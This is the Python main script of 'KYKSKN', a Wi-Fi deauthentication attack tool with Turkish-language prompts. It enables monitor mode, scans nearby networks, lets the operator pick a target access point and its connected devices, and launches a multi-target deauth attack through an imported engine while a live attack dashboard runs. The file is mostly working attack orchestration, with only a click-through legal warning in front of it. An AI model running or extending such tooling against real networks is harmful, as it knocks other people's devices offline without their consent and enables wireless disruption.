#!/usr/bin/env python3
"""
KYKSKN - Multi-Target Deauth Attack Framework
Main Entry Point
"""

import sys
import os
import subprocess
import time
import questionary
from rich.console import Console

# Check Python version
if sys.version_info < (3, 8):
    print("Error: Python 3.8 or higher is required")
    sys.exit(1)

# Auto-install dependencies
def check_and_install_dependencies():
    """Check and install required Python packages"""
    console = Console()
    required_packages = [
        'scapy',
        'rich',
        'questionary',
        'pyfiglet',
        'netifaces',
        'psutil',
        'colorama'
    ]
    
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        console.print(f"[yellow]⚙️  Eksik kütüphaneler tespit edildi: {', '.join(missing_packages)}[/yellow]")
        console.print("[yellow]⚙️  Kütüphaneler yükleniyor...[/yellow]")
        
        try:
            # Try with --break-system-packages for Kali Linux
            subprocess.check_call([
                sys.executable, '-m', 'pip', 'install', '--quiet', '--break-system-packages', *missing_packages
            ], stderr=subprocess.DEVNULL)
            console.print("[green]✓ Tüm kütüphaneler başarıyla yüklendi![/green]")
            time.sleep(1)
        except subprocess.CalledProcessError:
            console.print(f"[red]✗ Otomatik yükleme başarısız[/red]")
            console.print("[yellow]Manuel yükleme için:[/yellow]")
            console.print(f"[cyan]  sudo pip3 install --break-system-packages -r requirements.txt[/cyan]")
            console.print("[yellow]veya:[/yellow]")
            console.print(f"[cyan]  sudo ./install.sh[/cyan]")
            sys.exit(1)

# Install dependencies first
check_and_install_dependencies()

# Now import the rest
from rich.console import Console
from core.wireless_manager import WirelessManager
from core.network_scanner import NetworkScanner
from core.deauth_engine import DeauthEngine
from ui.banner import show_banner, show_legal_warning, show_section_header, show_success, show_error, show_warning
from ui.menu import show_main_menu, select_network, select_clients, confirm_attack, show_help, show_settings
from ui.dashboard import AttackDashboard, show_attack_summary
from utils.validators import is_root, check_tool_exists
from utils.helpers import setup_signal_handlers, clear_screen, press_any_key
from utils.logger import logger
from config.settings import REQUIRED_TOOLS

console = Console()


class KYKSKN:
    """Main application class"""
    
    def __init__(self):
        self.wireless_manager = None
        self.network_scanner = None
        self.deauth_engine = None
        self.monitor_interface = None
        
    def check_requirements(self) -> bool:
        """Check system requirements"""
        console.print("[cyan]═══ Sistem Kontrolleri ═══[/cyan]\n")
        
        # Check root
        if not is_root():
            show_error("Root yetkisi gerekli! Lütfen 'sudo' ile çalıştırın.")
            return False
        show_success("Root yetkisi: OK")
        
        # Check required tools
        missing_tools = []
        for tool in REQUIRED_TOOLS:
            if not check_tool_exists(tool):
                missing_tools.append(tool)
        
        if missing_tools:
            show_error(f"Eksik araçlar: {', '.join(missing_tools)}")
            show_warning("Kali Linux'ta: sudo apt install aircrack-ng")
            return False
        show_success("Aircrack-ng suite: OK")
        
        console.print()
        return True
    
    def setup_wireless(self) -> bool:
        """Setup wireless interface"""
        show_section_header("Wireless Adapter Kurulumu")
        
        self.wireless_manager = WirelessManager()
        
        # Get wireless interfaces
        interfaces = self.wireless_manager.get_wireless_interfaces()
        
        if not interfaces:
            show_error("Wireless adapter bulunamadı!")
            return False
        
        console.print(f"[green]✓ Wireless adapter bulundu: {', '.join(interfaces)}[/green]")
        
        # Use first interface
        interface = interfaces[0]
        
        # Enable monitor mode
        self.monitor_interface = self.wireless_manager.enable_monitor_mode(interface)
        
        if not self.monitor_interface:
            show_error("Monitor mode aktif edilemedi!")
            return False
        
        console.print()
        return True
    
    def scan_networks(self) -> bool:
        """Scan for networks"""
        show_section_header("Ağ Tarama", "Çevredeki kablosuz ağlar taranıyor...")
        
        console.print(f"[dim]🔍 DEBUG: Monitor interface: {self.monitor_interface}[/dim]")
        
        self.network_scanner = NetworkScanner(self.monitor_interface)
        
        # Start scan
        console.print(f"[yellow]⏳ 15 saniye tarama başlatılıyor...[/yellow]")
        success = self.network_scanner.start_scan(duration=15)
        
        if not success:
            show_error("Ağ taraması başarısız!")
            console.print(f"[yellow]💡 İpucu: Log dosyasını kontrol edin: logs/kykskn_*.log[/yellow]")
            return False
        
        # Get results
        console.print(f"[dim]🔍 DEBUG: get_sorted_aps() çağrılıyor...[/dim]")
        aps = self.network_scanner.get_sorted_aps()
        
        if not aps:
            show_error("Hiç ağ bulunamadı!")
            console.print(f"[yellow]💡 Olası nedenler:[/yellow]")
            console.print(f"[yellow]  • Çevrede WiFi ağı yok[/yellow]")
            console.print(f"[yellow]  • Wireless adapter sinyal almıyor[/yellow]")
            console.print(f"[yellow]  • Monitor mode düzgün çalışmıyor[/yellow]")
            console.print(f"[yellow]  • Tarama süresi çok kısa (15 saniye)[/yellow]")
            console.print()
            console.print(f"[cyan]🔧 Test için: sudo airodump-ng {self.monitor_interface}[/cyan]")
            return False
        
        show_success(f"{len(aps)} ağ bulundu")
        console.print()
        
        return True
    
    def select_target_network(self):
        """Select target network"""
        show_section_header("Hedef Ağ Seçimi")
        
        # Get current network (if any)
        current_network = self.wireless_manager.get_connected_network()
        current_ssid = current_network[0] if current_network else None
        
        # Get sorted APs
        aps = self.network_scanner.get_sorted_aps()
        
        # Show selection menu
        selected_ap = select_network(aps, current_ssid)
        
        if not selected_ap:
            show_warning("Ağ seçilmedi")
            return None
        
        show_success(f"Seçilen ağ: {selected_ap.essid} ({selected_ap.bssid})")
        console.print()
        
        return selected_ap
    
    def select_target_clients(self, ap):
        """Select target clients"""
        show_section_header("Hedef Cihaz Seçimi", f"Ağ: {ap.essid}")
        
        # Get clients for this AP
        clients = self.network_scanner.get_clients_for_ap(ap.bssid)
        
        console.print(f"[dim]🔍 DEBUG: AP BSSID: {ap.bssid}[/dim]")
        console.print(f"[dim]🔍 DEBUG: Bulunan client sayısı: {len(clients)}[/dim]")
        
        if not clients:
            show_error("Bu ağda bağlı cihaz bulunamadı!")
            show_warning("Cihazlar bağlandıkça tekrar tarama yapabilirsiniz.")
            console.print(f"[yellow]💡 İpucu: Ağda aktif cihaz olduğundan emin olun[/yellow]")
            console.print(f"[yellow]💡 Daha uzun tarama süresi deneyin[/yellow]")
            return None
        
        # DEBUG: Show all clients
        console.print(f"[dim]🔍 DEBUG: Client MAC'ler:[/dim]")
        for client in clients:
            console.print(f"[dim]  • {client.mac} -> {client.bssid} ({client.power} dBm)[/dim]")
        
        # Get user's MAC (try to detect)
        user_mac = self.wireless_manager.original_mac
        console.print(f"[dim]🔍 DEBUG: Kullanıcı MAC: {user_mac}[/dim]")
        
        # Show client selection
        selected_macs, select_all = select_clients(clients, user_mac)
        
        console.print(f"[dim]🔍 DEBUG: Seçilen MAC sayısı: {len(selected_macs) if selected_macs else 0}[/dim]")
        
        if not selected_macs:
            show_warning("Hiç hedef seçilmedi")
            return None
        
        show_success(f"{len(selected_macs)} hedef seçildi")
        console.print()
        
        return selected_macs
    
    def execute_attack(self, ap, target_macs):
        """Execute deauth attack"""
        console.print(f"[dim]🔍 DEBUG: execute_attack çağrıldı[/dim]")
        console.print(f"[dim]🔍 DEBUG: AP: {ap.essid} ({ap.bssid})[/dim]")
        console.print(f"[dim]🔍 DEBUG: Hedef sayısı: {len(target_macs)}[/dim]")
        console.print(f"[dim]🔍 DEBUG: Monitor interface: {self.monitor_interface}[/dim]")
        
        # Confirm attack
        try:
            confirmed = confirm_attack(len(target_macs), ap.essid)
            console.print(f"[dim]🔍 DEBUG: Onay sonucu: {confirmed}[/dim]")
            
            if not confirmed:
                show_warning("Saldırı iptal edildi")
                return
        except Exception as e:
            console.print(f"[red]✗ Onay hatası: {e}[/red]")
            return
        
        console.print()
        show_section_header("Saldırı Başlatılıyor")
        
        # Set channel
        self.wireless_manager.set_channel(self.monitor_interface, ap.channel)
        show_success(f"Kanal ayarlandı: {ap.channel}")
        
        # Initialize deauth engine
        self.deauth_engine = DeauthEngine(self.monitor_interface)
        
        # Add targets
        for mac in target_macs:
            self.deauth_engine.add_target(mac, ap.bssid, ap.essid)
        
        show_success(f"{len(target_macs)} hedef eklendi")
        console.print()
        
        # Start attack
        self.deauth_engine.start_attack()
        
        time.sleep(2)  # Give time for processes to start
        
        # Show dashboard
        try:
            dashboard = AttackDashboard(ap.essid, ap.bssid, len(target_macs))
            dashboard.run(
                self.deauth_engine.get_attack_stats,
                self.deauth_engine.get_all_targets_status
            )
        except KeyboardInterrupt:
            pass
        finally:
            # Stop attack
            self.deauth_engine.stop_attack()
        
        # Show summary
        console.print()
        stats = self.deauth_engine.get_attack_stats()
        targets = self.deauth_engine.get_all_targets_status()
        show_attack_summary(stats, targets)
        
        press_any_key()
    
    def attack_workflow(self):
        """Complete attack workflow"""
        try:
            # Setup wireless
            if not self.setup_wireless():
                return
            
            # Scan networks
            if not self.scan_networks():
                return
            
            # Select target network
            target_ap = self.select_target_network()
            if not target_ap:
                return
            
            # Select target clients
            target_macs = self.select_target_clients(target_ap)
            if not target_macs:
                return
            
            # Execute attack
            self.execute_attack(target_ap, target_macs)
            
        except KeyboardInterrupt:
            console.print("\n[yellow]⚠️  İşlem iptal edildi[/yellow]")
        except Exception as e:
            logger.error(f"Attack workflow error: {e}")
            show_error(f"Hata: {e}")
    
    def run(self):
        """Main application loop"""
        try:
            # Setup signal handlers
            setup_signal_handlers()
            
            # Setup logger
            logger.setup()
            
            # Clear screen and show banner
            clear_screen()
            show_banner()
            
            # Show legal warning
            show_legal_warning()
            
            # Confirm legal agreement
            if not questionary.confirm("Yasal uyarıyı okudum ve kabul ediyorum", default=False).ask():
                console.print("[yellow]Program sonlandırılıyor...[/yellow]")
                return
            
            console.print()
            
            # Check requirements
            if not self.check_requirements():
                return
            
            # Main loop
            while True:
                clear_screen()
                show_banner()
                
                choice = show_main_menu()
                
                if choice == "attack":
                    clear_screen()
                    show_banner()
                    self.attack_workflow()
                    
                elif choice == "help":
                    clear_screen()
                    show_help()
                    
                elif choice == "settings":
                    clear_screen()
                    show_settings()
                    
                elif choice == "exit":
                    break
            
            console.print("\n[cyan]Güle güle! 👋[/cyan]\n")
            
        except KeyboardInterrupt:
            console.print("\n\n[yellow]Program sonlandırılıyor...[/yellow]")
        except Exception as e:
            logger.critical(f"Fatal error: {e}")
            show_error(f"Kritik hata: {e}")
        finally:
            # Cleanup
            if self.deauth_engine:
                self.deauth_engine.cleanup()
            if self.network_scanner:
                self.network_scanner.cleanup()
            if self.wireless_manager:
                self.wireless_manager.disable_monitor_mode()


def main():
    """Entry point"""
    app = KYKSKN()
    app.run()


if __name__ == "__main__":
    main()

